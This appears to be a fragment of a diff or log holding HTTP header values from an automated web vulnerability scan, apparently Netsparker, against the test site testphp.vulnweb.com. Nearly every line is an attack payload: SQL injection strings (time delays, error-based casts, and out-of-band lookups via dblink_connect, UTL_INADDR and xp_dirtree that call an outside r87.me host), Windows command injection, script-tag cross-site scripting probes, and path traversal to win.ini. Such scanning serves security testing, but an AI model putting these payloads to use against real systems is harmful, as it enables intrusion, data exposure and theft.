+    User-Agent: '+ (select convert(int, cast(0x5f21403264696c656d6d61 as varchar(8000))) from syscolumns) +'
+    User-Agent: (select convert(int,cast(0x5f21403264696c656d6d61 as varchar(8000))) from syscolumns)
+    User-Agent: SELECT dblink_connect('host=zqvil4-pt7akzgcsg5tn0_axoupkr5jq6lmgxdzh'||'key.r87.me user=a password=a connect_timeout=2')
+    User-Agent: '||(SELECT dblink_connect('host=zqvil4-pt7be9zi19o02kjdek-d0zbbiygz8r4gi'||'zuk.r87.me user=a password=a connect_timeout=2'))||'
+    User-Agent: SELECT dblink_connect('host=zqvil4-pt7prpgnv-vjvhrtrclo26tsypgcvmir6'||'ojy.r87.me user=a password=a connect_timeout=2')
+    User-Agent: '||(SELECT dblink_connect('host=zqvil4-pt7q5r5dxl1sujrhg5jexrctvjgmb_wcf'||'mj8.r87.me user=a password=a connect_timeout=2'))||'
+    User-Agent: (select dbms_pipe.receive_message((chr(95)||chr(33)||chr(64)||chr(51)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97)),25) from dual)
+    User-Agent: SELECT pg_sleep(25)--
+    User-Agent: ((select sleep(25)))a-- 1
+    User-Agent: (select UTL_INADDR.GET_HOST_ADDRESS(chr(122)||chr(113)||chr(118)||chr(105)||chr(108)||chr(52)||chr(45)||chr(112)||chr(116)||chr(55)||chr(102)||chr(102)||chr(115)||chr(116)||chr(119)||chr(56)||chr(103)||chr(103)||chr(104)||chr(108)||chr(121)||chr(110)||chr(113)||chr(98)||chr(101)||chr(109)||chr(95)||chr(108)||chr(120)||chr(103)||chr(50)||chr(116)||chr(111)||chr(102)||chr(101)||chr(97)||chr(102)||chr(111)||chr(119)||chr(112)||chr(110)||chr(98)||chr(115)||chr(46)||chr(114)||chr(56)||chr(55)||chr(46)||chr(109)||chr(101)) from DUAL)
+    User-Agent: (select UTL_INADDR.GET_HOST_ADDRESS(chr(122)||chr(113)||chr(118)||chr(105)||chr(108)||chr(52)||chr(45)||chr(112)||chr(116)||chr(55)||chr(111)||chr(110)||chr(122)||chr(45)||chr(119)||chr(112)||chr(51)||chr(117)||chr(107)||chr(116)||chr(98)||chr(105)||chr(120)||chr(122)||chr(45)||chr(108)||chr(105)||chr(98)||chr(99)||chr(104)||chr(110)||chr(99)||chr(118)||chr(114)||chr(57)||chr(121)||chr(95)||chr(104)||chr(51)||chr(106)||chr(100)||chr(107)||chr(111)||chr(46)||chr(114)||chr(56)||chr(55)||chr(46)||chr(109)||chr(101)) from DUAL)
+    User-Agent: (select UTL_INADDR.GET_HOST_ADDRESS('zqvil4-pt7jzzixtltorj430p9lezjm3vopvfeuy'||'4iw.r87.me') from DUAL)
+    User-Agent: (select UTL_INADDR.GET_HOST_ADDRESS('zqvil4-pt7rmn4rufu6vqiuv8zflcudo-ilky633'||'g6q.r87.me') from DUAL)
+    User-Agent: '& SET /A 0xFFF9999-31316 &
+    User-Agent: SET /A 0xFFF9999-34640 &
+    User-Agent: & SET /A 0xFFF9999-42915 &
+    User-Agent: SET /A 0xFFF9999-60765 &
+    User-Agent: "& SET /A 0xFFF9999-74405 &
+    User-Agent: "& SET /A 0xFFF9999-78827 &
+    User-Agent: SET /A 0xFFF9999-84645
+    User-Agent: '& SET /A 0xFFF9999-91310 &
+    User-Agent: & SET /A 0xFFF9999-94592 &
+    User-Agent: SET /A 0xFFF9999-99919
+    User-Agent: '"--></style></scRipt><scRipt>netsparker(0x000087)</scRipt>
+    User-Agent: '"@--></style></scRipt><scRipt>netsparker(0x0000A4)</scRipt>
+    User-Agent: '"--></style></scRipt><scRipt>netsparker(0x00020B)</scRipt>
+    User-Agent: '"@--></style></scRipt><scRipt>netsparker(0x000227)</scRipt>
+    User-Agent: syscolumns WHERE 2>3;exec('xp_dirtree ''\\zqvil4-pt7udippzffmk5urfsg4vow00aa2srefp'+'3he.r87.me'+'\c$\a''')--
+    User-Agent: syscolumns WHERE 2>3;exec('xp_dirtree ''\\zqvil4-pt7v77x2giydkml4dbylosehxw6lc5ufb'+'zia.r87.me'+'\c$\a''')--
+    User-Agent: testphp.vulnweb.com/elmah
+    User-Agent: testphp.vulnweb.com/elmah.axd
+    User-Agent: testphp.vulnweb.com/trace.axd
+    User-Agent: ' WAITFOR DELAY '0:0:25'--
+    User-Agent: ') WAITFOR DELAY '0:0:25'--
+    User-Agent: WAITFOR DELAY '0:0:25'--
+    User-Agent: . . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /windows/win.ini
+    User-Agent: .....///.....///.....///.....///.....///.....///.....///.....///.....///.....///.....///windows/win.ini
+    User-Agent: ....//....//....//....//....//....//....//....//....//....//....//windows/win.ini
+    User-Agent: ...//...//...//...//...//...//...//...//...//...//...//windows/win.ini
+    User-Agent: /../../../../../../../../../../windows/win.ini
+    X-NS: N19469765S
+    X-NS: N14838567S
 
 
 
